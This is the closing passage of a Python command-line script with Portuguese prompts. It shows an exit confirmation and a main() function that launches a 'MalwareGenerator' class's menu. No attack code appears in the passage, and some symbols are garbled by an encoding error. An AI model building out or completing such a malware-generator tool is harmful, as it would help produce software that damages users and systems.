        if Confirm.ask("\nDeseja realmente sair?"):
            console.print("[cyan]Saindo... Obrigado por usar com responsabilidade![/cyan]")
            time.sleep(2)
            sys.exit(0)

def main():
    try:
        generator = MalwareGenerator()
        generator.main_menu()
    except KeyboardInterrupt:
        console.print("\n[red]‚úó Programa interrompido pelo usu√°rio[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]‚úó Erro: {str(e)}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    main()
